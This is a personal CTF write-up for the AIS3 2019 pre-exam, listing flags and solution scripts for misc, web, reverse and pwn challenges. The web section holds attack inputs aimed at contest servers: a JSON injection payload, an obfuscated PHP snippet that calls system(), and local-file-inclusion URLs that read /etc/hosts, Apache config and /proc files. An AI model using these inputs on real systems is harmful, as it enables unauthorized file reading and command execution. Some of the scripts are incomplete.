
MyFirstCTF & Pre-Exam AIS3 2019 
===

[TOC]

---

# Misc

## WELCOME 
```=bash
AIS3{echo -n 'Welcom to AIS3 pre-exam in 2019!' | md5sum}
AIS3{988069d2c08c1910f422737ca412afe2}
```

----

## kucfsj

### Using Python to revert string

```=python=
kcufsj  = 'kcufsj_FILE_DATA'
print(kcufsj[::-1])
```
### After that, you will get the right JSFUCK code, execute on your browser Console  ,then your will get the FLAG
console.log('AIS3{R33v33rs33_JSFUCKKKKKK}')

```
AIS3{R33v33rs33_JSFUCKKKKKK}

```
## TCash
```=python=
from hashlib import md5,sha256
# from secret import FLAG
cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@,- _{}'
md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]
sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]

flags = ''
for i in range(len(md5s)):
    for f in cand :
            if ( (int(md5(f.encode()).hexdigest(),16)%64 ) == md5s[i] and (int(sha256(f.encode()).hexdigest(),16)%64) == sha256s[i]):
                flags += f
                break
    

print(flags)

```

```
AIS3{0N_May_16th @Sead00g said Heeeee ReMEMBerEd tH4t heee UseD thE SAME set 0f On1iNe to01s to S01Ve Rsa AeS RCA DE5 at T-cat-cup, AnD 7he kEys aRE AlWAys TCat2019Key}

```
----

## Are you admin?

### WAF Protect
Age can't include ascii_letters [a-zA-Z] ,but special letters is fine, ex. [{}:]

### Payload
```=bash
nc pre-exam-chals.ais3.org 10203
Your name:
1","is_admin":"yes","test":{"t":"t
Your age:
1"},"2":"1
```
```
AIS3{RuBy_js0n_i5_s0_w3ird_0_o}
```

---

# Web 

## SimpleWindow 
```
AIS3{D0_y0u_kn0w_Serv1ce_W0rker?}
```
----

## Hidden

using JS beautify to get source code

```=javascript
var r = function() {
            return function() {
                var r = Array.prototype.slice.call(arguments),
                    t = r.shift();
                return r.reverse().map(function(r, e) {
                    return String.fromCharCode(r - t - 25 - e)
                }).join("")
            }(12, 144, 165, 95, 167, 140, 95, 157, 94, 164, 91, 122, 111, 102) + 4..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split("").map(function(r) {
                return String.fromCharCode(r.charCodeAt() + -13)
            }).join("") + 1234274547001..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split("").map(function(r) {
                return String.fromCharCode(r.charCodeAt() + -13)
            }).join("") + 579..toString(36).toLowerCase() + function() {
                var r = Array.prototype.slice.call(arguments),
                    t = r.shift();
                return r.reverse().map(function(r, e) {
                    return String.fromCharCode(r - t - 44 - e)
                }).join("")
            }(18, 190, 127, 170, 113)
        };
```

```
<!--Call r() in browser console  -->
AIS3{4r3_y0u_4_fr0n73nd_g33k?}
```

----
## 3v4l
```=php
<?php
$_ = "{`{{{`}{}`"^"_?<>/;_<_=" ;//_GET["G"]
$test = "$_" ;//_GET
$_GET["G"] = "system('ls');";
?>
```

----


## d1v1n6

### LFI
http://pre-exam-web.ais3.org:10103/?path=php://filter/read=convert.base64-encode/resource=http://localhost

### get flag file name

FLAG_14d65189669f05d206764c9de441474d.txt

http://pre-exam-web.ais3.org:10103/?path=php://filter/read=convert.base64-encode/resource=http://localhost/14d65189669f05d206764c9de441474d.txt

```
  AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd}
 ```
 
## d1v1n6 Deeper
Hints:
```
                 ^`.                     o
 ^_              \  \                  o  o
 \ \             {   \                 o
 {  \           /     `~~~--__
 {   \___----~~'              `~~-_     ______          _____
  \                         /// a  `~._(_||___)________/___
  / /~~~~-, ,__.    ,      ///  __,,,,)      o  ______/    \
  \/      \/    `~~~;   ,---~~-_`~= \ \------o-'            \
                   /   /            / /
                  '._.'           _/_/
                                  ';|\
Your flag:
  AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd}

Hints for d1v1n6 d33p3r:
- Find the other web server in the internal network.
- Scanning is forbidden and not necessary.
- Flag is stored as an environment variable.
```
Linux version 4.15.0-1032-gcp (buildd@lgw01-amd64-027) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #34-Ubuntu SMP Wed May 8 13:02:46 UTC 2019
http://pre-exam-web.ais3.org:10103/?path=/etc/apache2/apache2.conf
http://pre-exam-web.ais3.org:10103/?path=file:///proc/self/cmdline
http://pre-exam-web.ais3.org:10103/?path=data:text/plain,%3C?php%20echo%20%22hi%22;?%3E
http://pre-exam-web.ais3.org:10103/?path=/etc/hosts
http://pre-exam-web.ais3.org:10103/?path=http://172.22.0.2

----

## Web Token 
Hint:express -> node.js -> npm -> package.json

---


# Reverse 


## Trivial
```
AIS3{This_is_a_reallllllllllly_boariiing_challenge}
```


----

## TsaiBro


![](https://i.imgur.com/mwSRCQm.png)

![](https://i.imgur.com/2Xczubp.png)

python Script:
```=python=
buf = '發財....發財...發財.....發財...發財......發財.....發財.......發財.......發財........發財......發財....發財.發財.......發財....發財...發財.....發財........發財........發財.......發財........發財...發財..發財.發財.....發財........發財........發財.發財.發財........發財........發財.發財..發財.......發財.....發財.發財.......發財........發財........發財.發財......發財.......發財........發財..發財......發財........發財........發財.......發財....發財.發財......發財........發財........發財...發財....發財...發財...發財.發財.發財..發財.發財.發財..發財...發財..發財..發財.......發財........發財........發財..發財......發財.......發財....發財...發財.......發財........發財.......'
buf_list = buf.split('發財')

tsai_list = string.ascii_lowercase+ string.ascii_uppercase + string.digits + '{}_'
tsai_list = tsai_list.replace('Z','')

flag = ''
for i in range(1,len(buf_list),2):
#     print(len(buf_list[i]),len(buf_list[i+1] ) ) 
    index = ((len(buf_list[i]) -1 ) * 8) + (len(buf_list[i+1]) -1)
    flag += tsai_list[index]
#     print(index)
print(flag)
```
```
AIS3{y0u_4re_a_b1g_f4n_0f_tsaibro_n0w}
```

---

## HolyGrenade
### Using Online Decompiler  HolyGrenade.pyc  to get source code and do some change to recover the right order

```
# Reversr 
# Python bytecode 3.7 (3394)
# Embedded file name: HolyGrenade.py
# Size of source mod 2**32: 829 bytes
# Decompiled by https://python-decompiler.com
# from secret import flag
from hashlib import md5

def OO0o(arg):
    arg = bytearray(arg, 'ascii')
    for Oo0Ooo in range(0, len(arg), 4):
        O0O0OO0O0O0 = arg[Oo0Ooo]
        iiiii = arg[(Oo0Ooo + 1)]

        ooo0OO = arg[(Oo0Ooo + 2)]
        
        II1 = arg[(Oo0Ooo + 3)]

        arg[Oo0Ooo] = iiiii
        arg[Oo0Ooo + 1] = II1
        arg[Oo0Ooo + 2] = O0O0OO0O0O0
        arg[Oo0Ooo + 3] = ooo0OO

    return arg.decode('ascii')
# bytearray
flag = 'AIS3'
flag += '0' * (len(flag) % 4)
flag = flag.encode('ascii')
for Oo0Ooo in range(0, len(flag), 4):
    for i in key:
        print(OO0o(i))
        
#     print(OO0o(key[1]))
    

```
Online MD5 : https://www.md5online.org/md5-decrypt.html 
```

<!--using Online Decrypt MD5 and you will get the FLAG-->
aab3fb739ad2d154fe856818d66b6427
343e0b500b25058ed52de927ca6bbd87
dc719b0b22f0fc5a6dfbfc0ee60c70a8
cd9e8edd75eb88b7873d9eab7dd685fe
6d740b3c874058ca047ab375ecb662f6
18fed6fa3fcf748e9530a6e10296c446
73d9c19bea1d91abb5f0f4eb24e9f567
a05e1b0e95d57c4566877d1b7eb27872
```

```

FLAG:
AIS3{7here_15_the_k1ll3r_ra661t}
```

---



# PWN
## Welcome BOF
```
AIS3{TOO0O0O0O0OO0O0OOo0o0o0o00_EASY}
```

----

## ORW
```
AIS3{B4by_sh311c0d1ng_yeeeeeeeeeeeeeeeeeee_:)}
```
---
